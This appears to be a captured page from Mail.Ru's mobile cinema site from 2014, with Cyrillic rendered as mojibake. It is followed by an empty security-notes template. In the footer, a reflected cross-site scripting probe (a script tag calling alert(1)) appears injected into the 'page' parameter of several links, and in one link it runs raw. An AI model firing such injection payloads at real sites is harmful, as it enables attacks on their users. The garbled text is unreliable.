							<img src="http://pic.afisha.mail.ru/2809769/" alt="">
							<b class="ttl">ÐÐµÑÐ°ÐºÐ»</b>
							<span class="txt">Ð±Ð¾ÐµÐ²Ð¸Ðº &#8226; Ð¿ÑÐ¸ÐºÐ»ÑÑÐµÐ½Ð¸Ñ</span>
						</a>
					</div>
				
					<div class="shd mb3">
						<a href="/cinema/movies/770160_strazhi_galaktiki/" class="b_tch-link-img">
							<span class="date"><b class="d">31</b><b class="m">ÐÑÐ»</b></span>
							<img src="http://pic.afisha.mail.ru/2647621/" alt="">
							<b class="ttl">Ð¡ÑÑÐ°Ð¶Ð¸ ÐÐ°Ð»Ð°ÐºÑÐ¸ÐºÐ¸</b>
							<span class="txt">Ð±Ð¾ÐµÐ²Ð¸Ðº &#8226; Ð¿ÑÐ¸ÐºÐ»ÑÑÐµÐ½Ð¸Ñ &#8226; ÑÐ°Ð½ÑÐ°ÑÑÐ¸ÐºÐ°</span>
						</a>
					</div>
				
		</div>
	

		
		








		<div class="block">
			<div class="shd">
				<h2><a href="/cinema/selections/"><i>ÐÐ¾Ð´Ð±Ð¾ÑÐºÐ¸ ÑÐ¸Ð»ÑÐ¼Ð¾Ð²</i></a></h2>
			</div>
				
					<div class="shd mb3">
						<a href="/cinema/selection/229_luchshie_misticheskie_filmi/" class="b_tch-link-img-l">
							<img src="http://pic.afisha.mail.ru/2931239/" alt="">
							<b class="ttl">ÐÑÑÑÐ¸Ðµ Ð¼Ð¸ÑÑÐ¸ÑÐµÑÐºÐ¸Ðµ ÑÐ¸Ð»ÑÐ¼Ñ</b>
							<span class="txt">35 ÑÐ°Ð¼ÑÑ ÑÑÑÐ°Ð½Ð½ÑÑ, ÑÑÑÐ°ÑÐ½ÑÑ, Ð·Ð°Ð³Ð°Ð´Ð¾ÑÐ½ÑÑ Ð¸...</span>
						</a>
					</div>
				
					<div class="shd mb3">
						<a href="/cinema/selection/220_15_sovetskih_komedii_kotorie_ne_pokazhut_po_tv_smotrite_onlain/" class="b_tch-link-img-l">
							<img src="http://pic.afisha.mail.ru/2845631/" alt="">
							<b class="ttl">15 ÑÐ¾Ð²ÐµÑÑÐºÐ¸Ñ ÐºÐ¾Ð¼ÐµÐ´Ð¸Ð¹, ÐºÐ¾ÑÐ¾ÑÑÐµ Ð½Ðµ Ð¿Ð¾ÐºÐ°Ð¶ÑÑ Ð¿Ð¾ Ð¢Ð: ÑÐ¼Ð¾ÑÑÐ¸ÑÐµ Ð¾Ð½Ð»Ð°Ð¹Ð½</b>
							<span class="txt">ÐÑ Ð²ÑÐ±ÑÐ°Ð»Ð¸ 15 Ð½Ð¾ÑÑÐ°Ð»ÑÐ³Ð¸ÑÐµÑÐºÐ¸Ñ ÑÐ¾Ð²ÐµÑÑÐºÐ¸Ñ ÐºÐ¾Ð¼ÐµÐ´Ð¸Ð¹,...</span>
						</a>
					</div>
				
					<div class="shd mb3">
						<a href="/cinema/selection/215_bedess_muvi_filmi_pro_ochen_plohih_malchikov/" class="b_tch-link-img-l">
							<img src="http://pic.afisha.mail.ru/2804522/" alt="">
							<b class="ttl">ÐÑÐ´ÑÑÑ-Ð¼ÑÐ²Ð¸: ÑÐ¸Ð»ÑÐ¼Ñ Ð¿ÑÐ¾ Ð¾ÑÐµÐ½Ñ Ð¿Ð»Ð¾ÑÐ¸Ñ Ð¼Ð°Ð»ÑÑÐ¸ÐºÐ¾Ð²</b>
							<span class="txt">ÐÐ¸Ð·Ð°Ð½ÑÑÐ¾Ð¿, ÑÐ¾ÑÐ¸Ð¾ÑÐ¾Ð±, Ð¼ÐµÑÐ·Ð°Ð²ÐµÑ Ð¸ Ð¾Ð±Ð°ÑÑÐºÐ°, Ð±ÑÐ´ÑÑÑ â ...</span>
						</a>
					</div>
				
		</div>



		
		<div class="block">
			<div class="shd">
				<h2><a href="/msk/cinema/articles/"><i>ÐÐ¾Ð²Ð¾ÑÑÐ¸</i></a></h2>
			</div>
			
			
			
			<div class="shd mb3">
				<a href="/cinema/news/43104/" class="b_tch-link-img">
					<img src="http://pic.afisha.mail.ru/2947859/" alt="">
					<b class="ttl">ÐÐ°ÑÐ²ÐµÐµÐ² Ñ Ð¥Ð¾Ð´ÑÐµÐ½ÐºÐ¾Ð²Ð¾Ð¹ Ð¿Ð¾Ð¿Ð°Ð´ÑÑ Ð² Ð»ÑÐ±Ð¾Ð²Ð½ÑÐ¹ ÑÑÐµÑÐ³Ð¾Ð»ÑÐ½Ð¸Ðº</b>
					<span class="txt">ÐÐºÑÐµÑ ÐÐ°ÐºÑÐ¸Ð¼ ÐÐ°ÑÐ²ÐµÐµÐ², ÑÑÐ¿ÑÑÐ³ ÐÐ»Ð¸Ð·Ð°Ð²ÐµÑÑ ÐÐ¾ÑÑÑÐºÐ¾Ð¹,...</span>
				</a>
			</div>
			
			
			<div class="shd mb3">
				<a href="/cinema/news/43098/" class="b_tch-link-img">
					<img src="http://pic.afisha.mail.ru/2945744/" alt="">
					<b class="ttl">ÐÑÑÐ¾ÑÐ¸Ñ Ð»ÑÐ±Ð²Ð¸ Ð£Ð¸ÑÐ½Ð¸ Ð¥ÑÑÑÑÐ¾Ð½ Ð¸ ÐµÐµ Ð¼ÑÐ¶Ð° Ð»ÑÐ¶ÐµÑ Ð² Ð¾ÑÐ½Ð¾Ð²Ñ ÑÐ¸Ð»ÑÐ¼Ð°</b>
					<span class="txt">ÐÐ¼ÐµÑÐ¸ÐºÐ°Ð½ÑÐºÐ°Ñ Ð°ÐºÑÑÐ¸ÑÐ° ÐÐ½Ð´Ð¶ÐµÐ»Ð° ÐÐ°ÑÑÐµÑÑ Ð´ÐµÐ±ÑÑÐ¸ÑÑÐµÑ Ð² ...</span>
				</a>
			</div>
			
			
			<div class="shd mb3">
				<a href="/cinema/news/43066/" class="b_tch-link-img">
					<img src="http://pic.afisha.mail.ru/2937439/" alt="">
					<b class="ttl">ÐÐ¶Ð¾Ð»Ð¸ ÑÑÑÐ´Ð¸ÑÑÑ Ð¿Ð¾ÐºÐ°Ð·ÑÐ²Ð°ÑÑ ÑÐ²Ð¾Ð¸ ÑÑÐ°ÑÑÐµ ÑÐ¸Ð»ÑÐ¼Ñ Ð´ÐµÑÑÐ¼</b>
					<span class="txt">ÐÐ¾Ð»Ð»Ð¸Ð²ÑÐ´ÑÐºÐ°Ñ Ð°ÐºÑÑÐ¸ÑÐ° ÐÐ½Ð´Ð¶ÐµÐ»Ð¸Ð½Ð° ÐÐ¶Ð¾Ð»Ð¸ Ð´Ð¾Ð»Ð³Ð¸Ðµ Ð³Ð¾Ð´Ñ...</span>
				</a>
			</div>
			
			
		</div>
	
	
	
	
		
			
			<div class="shd">
				<h2><a href="/cinema/top/"><i>ÐÑÑÑÐ¸Ðµ ÑÐ¸Ð»ÑÐ¼Ñ</i></a></h2>
			</div>
			
		
			
			<div class="shd">
				<h2><a href="/awards/"><i>ÐÑÐµÐ¼Ð¸Ð¸</i></a></h2>
			</div>
			
		
			
			<div class="shd">
				<h2><a href="/msk/cinema/articles/"><i>ÐÐ¾Ð²Ð¾ÑÑÐ¸</i></a></h2>
			</div>
			
		
		
		
	
	
		<div class="shd">
			<div class="pd">
				<form id="search-form" action="/search/">
				<input type="hidden" value="70" name="region_id"/>
				<table class="srch">
				<tr>
					<td><input type="text" class="inp" name="q" value="ÐÐ¾Ð¸ÑÐº Ð¿Ð¾ ÑÐ°Ð¹ÑÑ" onfocus="if(value=='ÐÐ¾Ð¸ÑÐº Ð¿Ð¾ ÑÐ°Ð¹ÑÑ') value=''"></td>
					<th><i class="bg-sbm"><input type="submit" class="sbm sbm-f" value="ÐÐ°Ð¹ÑÐ¸"></i></th>
				</tr>
				</table>
				</form>
			</div>
		</div>
		
	
   <div id="slot_5924"></div>
	<script>
		(function(){
			ru.mail.cpf.Touch.Tools.loadSlot([
				{ slot: '3333', slotParams: {sz: '2'}, blockSel: '#slot_3333' },
				{ slot: '5924', slotParams: {sz: '2'}, blockSel: '#slot_5924' }
			]);
		})();
	</script>
	
	<div class="portal-footer">
		<div class="portal-footer__block portal-footer__logout js-userblock">
			<div class="portal-footer__logout__link hidden js-user_auth">
				<span class="portal-footer__avatar js-user_avatar"></span>
				<span class="portal-footer__email  js-user_email"></span>
				<br>
				<a href="http://m.mail.ru/cgi-bin/ajax_weather_city?mobile=1&act=change&page=http://touch.afisha.mail.ru" class="portal-footer__link">ÐÐ¾ÑÐºÐ²Ð°</a>&nbsp;| <a href="http://swa.mail.ru/cgi-bin/logout?Page=http%3A%2F%2Ftouch.afisha.mail.ru%2F%3Fpage%3Ddab52%26quot%3B%26gt%3B%26lt%3Bscript%26gt%3Balert(1)%26lt%3B%2Fscript%26gt%3Bff243" class="portal-footer__link">ÐÑÐ¹ÑÐ¸</a>
			</div>
			<div class="js-user_noauth">
				<a href="http://m.mail.ru/cgi-bin/ajax_weather_city?mobile=1&act=change&page=http://touch.afisha.mail.ru" class="portal-footer__link">ÐÐ¾ÑÐºÐ²Ð°</a>&nbsp;| 
				<a href="http://touch.mail.ru/cgi-bin/login?page=http%3A%2F%2Ftouch.afisha.mail.ru%2F%3Fpage%3Ddab52%26quot%3B%26gt%3B%26lt%3Bscript%26gt%3Balert(1)%26lt%3B%2Fscript%26gt%3Bff243" class="portal-footer__link">ÐÐ¾Ð¹ÑÐ¸</a>
			</div>
		</div>
		<script type="text/javascript" src="/js/touch/user_data/fj.userBlock.js?1400835529"></script>
		<div class="portal-footer__block">
			<a href="/go-afisha/?page=dab52"><script>alert(1)</script>ff243" class="portal-footer__link">ÐÐ¾Ð»Ð½Ð°Ñ Ð²ÐµÑÑÐ¸Ñ</a>&nbsp;|
			<a href="http://m.mail.ru/" class="portal-footer__link">ÐÐ»Ð°Ð²Ð½Ð°Ñ</a>&nbsp;|
			<a href="http://m.mail.ru/cgi-bin/splash?all=1" class="portal-footer__link">ÐÑÐµ Ð¿ÑÐ¾ÐµÐºÑÑ</a>
		</div>
		<div class="portal-footer__block">
			<span class="portal-footer__geo">
				
			</span>
		</div>
		<div class="portal-footer__copyright">
			&#169; Mail.Ru, 1999-2014
			&nbsp;&nbsp;<a href="/feedback/" class="portal-footer__link">ÐÐ±ÑÐ°ÑÐ½Ð°Ñ ÑÐ²ÑÐ·Ñ</a>
		</div>
	</div>	
<script>
(function ($) {
	if (window.pageYOffset != 0 || /CriOS/.test(window.navigator.userAgent)) {
		return;
	}
	var jHeadline = $('.js-headline');
	var iTop = 1;
	if (jHeadline.length > 0) {
		iTop = jHeadline[0].clientHeight
	}
	window.scrollTo(0, iTop);
})($f);
</script>

<div class="counters">
    <!-- 2931 2 -->
    <img src="http://rs.mail.ru/d1383139.gif?sz=2&amp;rnd=176725571&ts=1401038749&sz=2" style="width:0;height:0;position:absolute;" alt=""/>

</div>

<!-- 346 ÑÐ»Ð¾Ñ Ð´Ð»Ñ iOs -->

<!-- /346 -->


<script type="text/javascript">
//<![CDATA[
(function(w, d) {
        if (w.rb_counter) return;
        function h() {
                var n, a = arguments;
                for(var i=a.length;i--;){
                        n = a[i].split(',');
                        for(var j=n.length;j--;){
                                c(n[j]);
                        }
                }
        }
        function c(n) {
                var m, r = parseInt(Math.random()*1E9), s;
                if (!(m = n.match(/^(?:cl([bn])|([adgin]))(\d+)(?:sz(\d+))?/))) return;
                if (m[1]) {
                        s = "s" + m[1];
                }
                else if(m[2] == "n") {
                        s = "nc";
                }
                else if(m[2]=="i") {
                        r = null;
                        s = m[2];
                }
                else {
                        s = m[2];
                }
                s += m[3] + ".gif?";
                if (m[4]) s += "sz=" + m[4];
                if (r) s += "&rnd=" + r;
                (new Image).src = "//rs.mail.ru/" + s;
        }
        (function(o, e, fn) {
                if (o.addEventListener) o.addEventListener(e, fn, false);
                else if (o.attachEvent) o.attachEvent('on' + e, fn);
                else o['on' + e] = fn;
        })(d, 'mousedown', function(e) {
                var n;
                e = e || w.event;
                e = e.target || e.srcElement;
                while (e.parentNode){
                        if ((n = e.getAttribute('name')) && (n = n.toString())){
                                h(n);
                        }
                        e = e.parentNode;
                }
        });
        w.rb_counter = h;
})(window, document);
//]]>
</script>

<img src="//cm.g.doubleclick.net/pixel?google_nid=mlru&amp;google_cm" width="1" height="1" border="0" alt="" style="position:absolute;" />



<img src="//rs.mail.ru/un?uniq=WggBAPgADwAB8B4B&amp;euniq=&amp;rnd=195080986" style="width:0;height:0;position:absolute;" alt=""/>

</div>
</div>
</body> 
</html>

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
